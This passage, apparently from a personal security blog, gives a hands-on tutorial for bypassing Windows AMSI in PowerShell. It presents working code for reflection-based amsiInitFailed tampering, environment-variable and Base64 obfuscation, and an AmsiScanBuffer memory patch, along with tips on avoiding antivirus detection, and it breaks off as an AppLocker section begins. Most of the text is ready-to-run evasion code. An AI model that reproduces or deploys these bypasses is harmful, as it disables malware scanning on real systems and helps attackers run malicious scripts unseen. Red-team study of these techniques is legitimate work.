FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"string\">&quot;Invoke&quot;</span>+<span class=\"string\">&quot;Mimikatz&quot;</span></span><br><span class=\"line\">InvokeMimikatz</span><br></pre></td></tr></table></figure>\n\n<p>Okay AMSI works well let‚Äôs try to see several ways to bypass it [ I will explain it in depth so bring ur coffee ]</p>\n<h3 id=\"Error-Forcing\"><a href=\"#Error-Forcing\" class=\"headerlink\" title=\"Error Forcing\"></a>Error Forcing</h3><p>Error forcing to bypass AMSI (Antimalware Scan Interface) is a technique used by attackers to <span style=\"color:yellow\">manipulate errors in a way that causes AMSI to fail, effectively bypassing its scanning functionality</span> , The idea is to exploit weaknesses or specific conditions that prevent AMSI from successfully scanning the content, thereby allowing potentially malicious scripts to execute without being detected.</p>\n<p>Let‚Äôs see an example , and break it into lines</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&#x27;System.Management.Automation.A&#x27;</span>;<span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span>;<span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$w</span>,<span class=\"variable\">$c</span>,<span class=\"variable\">$m</span>))</span><br><span class=\"line\"><span class=\"variable\">$field</span> = <span class=\"variable\">$assembly</span>.GetField((<span class=\"string\">&#x27;am&#123;0&#125;InitFailed&#x27;</span> <span class=\"operator\">-f</span> </span><br><span class=\"line\"><span class=\"variable\">$c</span>),<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$field</span>.SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>$w &#x3D; ‚ÄòSystem.Management.Automation.A‚Äô;$c &#x3D; ‚Äòsi‚Äô;$m &#x3D; ‚ÄòUtils‚Äô</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&#x27;System.Management.Automation.A&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>We have 3 variables here $w , $c , $m if u combine them u will get <code>System.Management.Automation.AmsiUtils</code> but what is it ?</p>\n<p><code>System.Management.Automation.AmsiUtils</code> is a class within the .NET framework that is part of the <code>System.Management.Automation</code> namespace.</p>\n<p>The primary purpose of <code>System.Management.Automation.AmsiUtils</code> is to provide utilities for interacting with AMSI. <span style=\"color:yellow\">It allows PowerShell scripts to be scanned for malicious content by the antivirus software before execution, helping to prevent the execution of malicious scripts</span>.</p>\n<ul>\n<li>$assembly &#x3D; [Ref].Assembly.GetType((‚Äò{0}m{1}{2}‚Äô -f $w,$c,$m))</li>\n</ul>\n<p>Let‚Äôs see it in a good way without variables</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>So what does that mean ?</p>\n<p>In the context of AMSI bypass techniques, obtaining the type information for <code>System.Management.Automation.AmsiUtils</code> is crucial because it allows you to interact with the internal fields and methods of this class, which are not accessible through regular PowerShell commands. By using <span style=\"color:yellow\">reflection</span>, you can access and manipulate private and internal members of the class, such as the <code>amsiInitFailed</code> field.</p>\n<p>But what is reflection ?</p>\n<p>Reflection is a feature in many programming languages, including .NET and Java, that allows a program to inspect and interact with its own structure and behavior at runtime. This includes inspecting types, methods, properties, fields, and other metadata, as well as creating and manipulating objects dynamically. Reflection is particularly powerful because it <span style=\"color:yellow\">allows for more dynamic and flexible code, though it can also introduce complexity and performance overhead</span>.</p>\n<p>Let‚Äôs see an important screenshot</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def1.png\" alt=\"\"></figure>\n\n\n<p>When you see this output, it means that :</p>\n<ol>\n<li>The type <code>AmsiUtils</code> is successfully retrieved from the assembly, indicating that AMSI is present and recognized.</li>\n<li>Since <code>AmsiUtils</code> is not public, it suggests that the class is intended for internal use within the .NET assembly.</li>\n<li>The type inherits from <code>System.Object</code>, which is typical for most classes in .NET</li>\n</ol>\n<ul>\n<li>$field &#x3D; $assembly.GetField((‚Äòam{0}InitFailed‚Äô -f $c),‚ÄôNonPublic,Static‚Äô)</li>\n</ul>\n<p>Let‚Äôs see it in a good way without variables</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$field</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)).GetField(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>, <span class=\"string\">&#x27;NonPublic,Static&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>This line retrieves the field <code>amsiInitFailed</code> from the <code>AmsiUtils</code> type. The <code>NonPublic</code> and <code>Static</code> flags indicate that it is a non-public (private or protected) static field.</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def2.png\" alt=\"\"></figure>\n\n\n<ul>\n<li>$field.SetValue($null,$true)</li>\n</ul>\n<p>Let‚Äôs see it in a good way without variables</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)).GetField(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>, <span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>By setting the value of the <code>amsiInitFailed</code> field to <code>true</code>, the script tricks PowerShell into believing that <span style=\"color:yellow\">AMSI failed to initialize properly</span>. As a result, PowerShell skips or disables AMSI‚Äôs scanning functionality.</p>\n<p>Nice now we break it let‚Äôs see bypass the AMSI</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def3.png\" alt=\"\"></figure>\n\n\n<p>We filed! , That‚Äôs okay</p>\n<p><a href=\"https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\">This command is very popular in AMSI bypass</a> so it‚Äôs regular to be detected</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def4.png\" alt=\"\"></figure>\n\n<h3 id=\"Obfuscation\"><a href=\"#Obfuscation\" class=\"headerlink\" title=\"Obfuscation\"></a>Obfuscation</h3><p>Obfuscation in AMSI bypass refers to techniques used to <span style=\"color:yellow\">conceal or disguise the code that performs the AMSI bypass</span>. The purpose is to make the bypass harder to detect by security software and reverse engineers, I will show u some ways that u can use Obfuscation to bypass</p>\n<h4 id=\"String-Splitting-and-Concatenation\"><a href=\"#String-Splitting-and-Concatenation\" class=\"headerlink\" title=\"String Splitting and Concatenation\"></a>String Splitting and Concatenation</h4><p>We tested it before in our last example but let us make it work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def5.png\" alt=\"\"></figure>\n\n\n<p>Let‚Äôs use <a href=\"https://github.com/RythmStick/AMSITrigger\">AMSITrigger</a> to see why we are blocked from <a href=\"https://www.bitdefender.com/\">Bitdefender</a></p>\n<p>Make an exception for ur dir to test the scripts</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def6.png\" alt=\"\"></figure>\n\n<p>Okay now we know where is the AMSI detect us let‚Äôs see how we can bypass it , We see it from the last example so i don‚Äôt need to explain what i do again</p>\n<p>from</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ReF</span>=[<span class=\"type\">ReF</span>].AsSemBlY.GEtTypE(<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$Ref</span>.GetFIElD(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SETValue(<span class=\"variable\">$NULl</span>,<span class=\"variable\">$truE</span>);</span><br></pre></td></tr></table></figure>\n\n<p>To</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&#x27;System.Management.Automation.A&#x27;</span>;<span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span>;<span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$w</span>,<span class=\"variable\">$c</span>,<span class=\"variable\">$m</span>))</span><br><span class=\"line\"><span class=\"variable\">$field</span> = <span class=\"variable\">$assembly</span>.GetField((<span class=\"string\">&#x27;am&#123;0&#125;InitFailed&#x27;</span> <span class=\"operator\">-f</span> </span><br><span class=\"line\"><span class=\"variable\">$c</span>),<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$field</span>.SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see if this work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def7.png\" alt=\"\"></figure>\n\n<p>The AMSI told us it‚Äôs clean but we are still on the radar , It doesn‚Äôt work again !!</p>\n<p>So i try to use more variables and concatinate them</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$namespace</span> = <span class=\"string\">&#x27;System.Management.Automation&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$classPrefix</span> = <span class=\"string\">&#x27;A&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$propertyName</span> = <span class=\"string\">&#x27;InitFailed&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$visibility</span> = <span class=\"string\">&#x27;NonPublic,Static&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&quot;<span class=\"variable\">$namespace</span>.<span class=\"variable\">$classPrefix</span>&quot;</span> <span class=\"comment\"># System.Management.Automation.A </span></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$fullClassName</span> = <span class=\"string\">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$w</span>, <span class=\"variable\">$c</span>, <span class=\"variable\">$m</span> <span class=\"comment\">#System.Management.Automation.AmsiUtils</span></span><br><span class=\"line\"><span class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType(<span class=\"variable\">$fullClassName</span>)</span><br><span class=\"line\"><span class=\"variable\">$propertyFullName</span> = <span class=\"string\">&#x27;am&#123;0&#125;&#123;1&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$c</span>, <span class=\"variable\">$propertyName</span></span><br><span class=\"line\"><span class=\"variable\">$field</span> = <span class=\"variable\">$assembly</span>.GetField(<span class=\"variable\">$propertyFullName</span>, <span class=\"variable\">$visibility</span>)</span><br><span class=\"line\"><span class=\"variable\">$field</span>.SetValue(<span class=\"variable\">$null</span>, <span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs try to check this out with <a href=\"https://github.com/gatariee/gocheck\">gocheck</a> and see if it works</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def8.png\" alt=\"\"></figure>\n\n<p>It doesn‚Äôt work again, Am‚Ä¶</p>\n<p>At this time I refused to move forward and try to learn other methods and combine them to bypass so I scratched my head and got a good idea</p>\n<p>We can use <span style=\"color:yellow\">environment variables</span> to evade detection by the antivirus , Let‚Äôs craft our script</p>\n<p>So I decided to write a PowerShell script That retrieves all environment variables to search for every word that I entered to get it immediately as a variable you can use it from my GitHub repo from <a href=\"https://github.com/N1NJ10/Bad_Scripts/blob/main/PowerShell/Envrandomizer.ps1\">here</a></p>\n<blockquote>\n<p>The idea behinde this sript come to me after seeing <a href=\"https://www.youtube.com/watch?v=-j7zzUwB_-E&t=414s\">Daniel Bohannon</a> explaining Invoke-CradleCrafter</p>\n</blockquote>\n<p>With this script, i can craft our payload in a new way</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"># Extract characters from system environment variables to form &quot;system&quot;</span><br><span class=\"line\">$s1 = [Environment]::GetEnvironmentVariable(&#x27;DriverData&#x27;)[11]  # &#x27;S&#x27;</span><br><span class=\"line\">$s2 = [Environment]::GetEnvironmentVariable(&quot;COMSPEC&quot;)[12]  # &#x27;y&#x27;</span><br><span class=\"line\">$s3 = [Environment]::GetEnvironmentVariable(&quot;ComSpec&quot;)[9] # &#x27;s&#x27;</span><br><span class=\"line\">$s4 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12] # &#x27;t&#x27;</span><br><span class=\"line\">$s5 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class=\"line\">$s6 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[9]  # &#x27;m&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">$s = &quot;$s1$s2$s3$s4$s5$s6&quot; # &quot;System&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Management&quot;</span><br><span class=\"line\">$m1 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[137]  # &#x27;M&#x27;</span><br><span class=\"line\">$m2 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class=\"line\">$m3 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22]  # &#x27;n&#x27;</span><br><span class=\"line\">$m4 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class=\"line\">$m5 = [Environment]::GetEnvironmentVariable(&quot;ProgramFiles(x86)&quot;)[6]  # &#x27;g&#x27;</span><br><span class=\"line\">$m6 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class=\"line\">$m7 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[9]  # &#x27;M&#x27;</span><br><span class=\"line\">$m8 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class=\"line\">$m9 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22] # &#x27;n&#x27;</span><br><span class=\"line\">$mx = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12] # &#x27;t&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">$m = &quot;$m1$m2$m3$m4$m5$m6$m7$m8$m9$mx&quot; # &quot;Management&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Automation&quot;</span><br><span class=\"line\">$a1 = [Environment]::GetEnvironmentVariable(&#x27;APPDATA&#x27;)[15]  # &#x27;A&#x27;</span><br><span class=\"line\">$a2 = [Environment]::GetEnvironmentVariable(&#x27;FPS_BROWSER_USER_PROFILE_STRING&#x27;)[4]  # &#x27;u&#x27;</span><br><span class=\"line\">$a3 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class=\"line\">$a4 = [Environment]::GetEnvironmentVariable(&quot;windir&quot;)[7]  # &#x27;o&#x27;</span><br><span class=\"line\">$a5 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[9]  # &#x27;m&#x27;</span><br><span class=\"line\">$a6 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class=\"line\">$a7 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class=\"line\">$a8 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[12]  # &#x27;i&#x27;</span><br><span class=\"line\">$a9 = [Environment]::GetEnvironmentVariable(&quot;windir&quot;)[7]  # &#x27;o&#x27;</span><br><span class=\"line\">$ax = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22]  # &#x27;n&#x27;</span><br><span class=\"line\">$a = &quot;$a1$a2$a3$a4$a5$a6$a7$a8$a9$ax&quot;  # &quot;Automation&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Amsi&quot;</span><br><span class=\"line\">$am0 =  [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[4] + [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13] # &#x27;si&#x27;</span><br><span class=\"line\">$am1 = [Environment]::GetEnvironmentVariable(&#x27;APPDATA&#x27;)[15]  # &#x27;A&#x27;</span><br><span class=\"line\">$am2 = [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[9]  # &#x27;m&#x27;</span><br><span class=\"line\">$am3 = [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[4]  # &#x27;s&#x27;</span><br><span class=\"line\">$am4  = [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13]  # &#x27;i&#x27;</span><br><span class=\"line\">$am = &quot;$am1$am2$am3$am4&quot;  # &quot;Amsi&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Utils&quot;</span><br><span class=\"line\">$u1 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[3]  # &#x27;U&#x27;</span><br><span class=\"line\">$u2 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class=\"line\">$u3 = [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13]  # &#x27;i&#x27;</span><br><span class=\"line\">$u4 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[40]  # &#x27;l&#x27;</span><br><span class=\"line\">$u5 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[49]  # &#x27;s&#x27;</span><br><span class=\"line\">$u = &quot;$u1$u2$u3$u4$u5&quot;  # &quot;Utils&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Construct the type name for AMSI Utils</span><br><span class=\"line\">$typeName = &quot;$s.$m.$a.$am$u&quot;  # &quot;System.Management.Automation.AmsiUtils&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Get the AMSI Utils type</span><br><span class=\"line\">$assembly = [Ref].Assembly.GetType($typeName)</span><br><span class=\"line\"></span><br><span class=\"line\"># Get the &#x27;amsiInitFailed&#x27; field</span><br><span class=\"line\"></span><br><span class=\"line\">$field = $assembly.GetField((&#x27;am&#123;0&#125;InitFailed&#x27; -f $am0), &#x27;NonPublic,Static&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># Set the &#x27;amsiInitFailed&#x27; field to true</span><br><span class=\"line\">$field.SetValue($null, $true)</span><br></pre></td></tr></table></figure>\n\n<p>That‚Äôs nice let‚Äôs try it</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def9.png\" alt=\"\"></figure>\n\n<blockquote>\n<p><strong>Remove the comments</strong> to avoid detecting i just put them for u to understand what I do<br>{: .prompt-tip }</p>\n</blockquote>\n<p>Bypassed ! , Yeah we did it together mate be creative in ur thoughts and u will see magic , Let‚Äôs see other methods</p>\n<blockquote>\n<p>Bypassing AMSI does not necessarily bypass all antivirus protections. Modern antivirus solutions employ multiple layers of defense, including behavioral analysis and heuristics, which can still detect and block malicious activities even if AMSI is bypassed.<br>{: .prompt-info }</p>\n</blockquote>\n<h4 id=\"Base64-Encoding\"><a href=\"#Base64-Encoding\" class=\"headerlink\" title=\"Base64 Encoding\"></a>Base64 Encoding</h4><p>Of course, encoding will get into the game, Let‚Äôs see how to use it</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$command</span> = <span class=\"string\">&#x27;hostname&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$bytes</span> = [<span class=\"type\">System.Text.Encoding</span>]::Unicode.GetBytes(<span class=\"variable\">$command</span>)</span><br><span class=\"line\"><span class=\"variable\">$encodedCommand</span> = [<span class=\"type\">Convert</span>]::ToBase64String(<span class=\"variable\">$bytes</span>)</span><br><span class=\"line\"><span class=\"built_in\">Write-Output</span> <span class=\"variable\">$encodedCommand</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$decodedBytes</span> = [<span class=\"type\">Convert</span>]::FromBase64String(<span class=\"variable\">$encodedCommand</span>)</span><br><span class=\"line\"><span class=\"variable\">$decodedCommand</span> = [<span class=\"type\">System.Text.Encoding</span>]::Unicode.GetString(<span class=\"variable\">$decodedBytes</span>)</span><br><span class=\"line\"><span class=\"built_in\">Invoke-Expression</span> <span class=\"variable\">$decodedCommand</span></span><br></pre></td></tr></table></figure>\n\n<p>This example takes a command [ hostname ] and encodes it to base64 then decodes and execute it this is the same method that we will be using</p>\n<blockquote>\n<p><a href=\"https://stackoverflow.com/questions/3538021/why-do-we-use-base64\">Why do we use bytes no encode and decode directly ?</a></p>\n<p>This is necessary because Base64 operates on byte data. Strings are sequences of characters, which must be converted to bytes for Base64 encoding.<br>{: .prompt-info }</p>\n</blockquote>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def10.png\" alt=\"\"></figure>\n\n\n<p>Let‚Äôs see how to use it in our script</p>\n<p>from</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ReF</span>=[<span class=\"type\">ReF</span>].AsSemBlY.GEtTypE(<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$Ref</span>.GetFIElD(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SETValue(<span class=\"variable\">$NULl</span>,<span class=\"variable\">$truE</span>);</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/\">To</a></p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Ref</span>].Assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.&#x27;</span>+<span class=\"variable\">$</span>([<span class=\"type\">Text.Encoding</span>]::Unicode.GetString([<span class=\"type\">Convert</span>]::FromBase64String(<span class=\"string\">&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;</span>)))).GetField(<span class=\"variable\">$</span>([<span class=\"type\">Text.Encoding</span>]::Unicode.GetString([<span class=\"type\">Convert</span>]::FromBase64String(<span class=\"string\">&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;</span>))),<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see if this work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def11.png\" alt=\"\"></figure>\n\n<p>Again we bypassed the AMSI with the Base64-encoded payload</p>\n<p>There is many obfuscation methods left , I will leave u some resources at the end of the post to check them out and try to make one of them work with u consider it as a task</p>\n<h3 id=\"Memory-Patch\"><a href=\"#Memory-Patch\" class=\"headerlink\" title=\"Memory Patch\"></a>Memory Patch</h3><p>The idea behind this bypass is to force <span style=\"color:yellow\">AmsiScanBuffer to return AMSI_RESULT_CLEAN</span>. The general idea is to import API calls and then return a specific value to the AmsiScanBuffer() call: 0x80070057. The original bypass is detected by AMSI now, so we can manipulate with assembly instructions by using a double add operand and successfully bypass the control. The code for this is as follows:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$Win32</span> = <span class=\"string\">@&quot;</span></span><br><span class=\"line\"><span class=\"string\">using System;</span></span><br><span class=\"line\"><span class=\"string\">using System.Runtime.InteropServices;</span></span><br><span class=\"line\"><span class=\"string\">public class Win32 &#123;</span></span><br><span class=\"line\"><span class=\"string\">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class=\"line\"><span class=\"string\">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class=\"line\"><span class=\"string\">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class=\"line\"><span class=\"string\">    public static extern IntPtr LoadLibrary(string name);</span></span><br><span class=\"line\"><span class=\"string\">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class=\"line\"><span class=\"string\">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">&quot;@</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Add-Type</span> <span class=\"variable\">$Win32</span></span><br><span class=\"line\"><span class=\"variable\">$test</span> = [<span class=\"built_in\">Byte</span>[]](<span class=\"number\">0</span>x61, <span class=\"number\">0</span>x6d, <span class=\"number\">0</span>x73, <span class=\"number\">0</span>x69, <span class=\"number\">0</span>x2e, <span class=\"number\">0</span>x64, <span class=\"number\">0</span>x6c, <span class=\"number\">0</span>x6c)</span><br><span class=\"line\"><span class=\"variable\">$LoadLibrary</span> = [<span class=\"type\">Win32</span>]::LoadLibrary([<span class=\"type\">System.Text.Encoding</span>]::ASCII.GetString(<span class=\"variable\">$test</span>))</span><br><span class=\"line\"><span class=\"variable\">$test2</span> = [<span class=\"built_in\">Byte</span>[]] (<span class=\"number\">0</span>x41, <span class=\"number\">0</span>x6d, <span class=\"number\">0</span>x73, <span class=\"number\">0</span>x69, <span class=\"number\">0</span>x53, <span class=\"number\">0</span>x63, <span class=\"number\">0</span>x61, <span class=\"number\">0</span>x6e, <span class=\"number\">0</span>x42, <span class=\"number\">0</span>x75, <span class=\"number\">0</span>x66, <span class=\"number\">0</span>x66, <span class=\"number\">0</span>x65, <span class=\"number\">0</span>x72)</span><br><span class=\"line\"><span class=\"variable\">$Address</span> = [<span class=\"type\">Win32</span>]::GetProcAddress(<span class=\"variable\">$LoadLibrary</span>, [<span class=\"type\">System.Text.Encoding</span>]::ASCII.GetString(<span class=\"variable\">$test2</span>))</span><br><span class=\"line\"><span class=\"variable\">$p</span> = <span class=\"number\">0</span></span><br><span class=\"line\">[<span class=\"type\">Win32</span>]::VirtualProtect(<span class=\"variable\">$Address</span>, [<span class=\"type\">uint32</span>]<span class=\"number\">5</span>, <span class=\"number\">0</span>x40, [<span class=\"type\">ref</span>]<span class=\"variable\">$p</span>)</span><br><span class=\"line\"><span class=\"variable\">$Patch</span> = [<span class=\"built_in\">Byte</span>[]] (<span class=\"number\">0</span>x31, <span class=\"number\">0</span>xC0, <span class=\"number\">0</span>x05, <span class=\"number\">0</span>x78, <span class=\"number\">0</span>x01, <span class=\"number\">0</span>x19, <span class=\"number\">0</span>x7F, <span class=\"number\">0</span>x05, <span class=\"number\">0</span>xDF, <span class=\"number\">0</span>xFE, <span class=\"number\">0</span>xED, <span class=\"number\">0</span>x00, <span class=\"number\">0</span>xC3)</span><br><span class=\"line\"><span class=\"comment\">#0:  31 c0                   xor    eax,eax</span></span><br><span class=\"line\"><span class=\"comment\">#2:  05 78 01 19 7f          add    eax,0x7f190178</span></span><br><span class=\"line\"><span class=\"comment\">#7:  05 df fe ed 00          add    eax,0xedfedf</span></span><br><span class=\"line\"><span class=\"comment\">#c:  c3                      ret </span></span><br><span class=\"line\">[<span class=\"type\">System.Runtime.InteropServices.Marshal</span>]::<span class=\"built_in\">Copy</span>(<span class=\"variable\">$Patch</span>, <span class=\"number\">0</span>, <span class=\"variable\">$Address</span>, <span class=\"variable\">$Patch</span>.Length)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs try it</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def12.png\" alt=\"\"></figure>\n\n<p>Again we bypassed the AMSI</p>\n<blockquote>\n<p>If u wanna deep dive into this u can write this <a href=\"https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b\">writeup</a><br>{: .prompt-tip }</p>\n</blockquote>\n<h2 id=\"AppLocker-and-Powershell-CLM\"><a href=\"#AppLocker-and-Powershell-CLM\" class=\"headerlink\" title=\"AppLocker and Powershell CLM\"></a>AppLocker and Powershell CLM</h2><p>Applocker is a white-listing solution With this feature, you can limit not only applications, but also scripts, batches, DLLs, and more. There are a few ways that a limit can be applied: <strong>by Name, Path, Publisher, or Hash</strong> , you can use rules to enforce it to Allow and deny as I will show you</p>\n<p>PowerShell Constrained Language Mode [ CLM ] is a <a 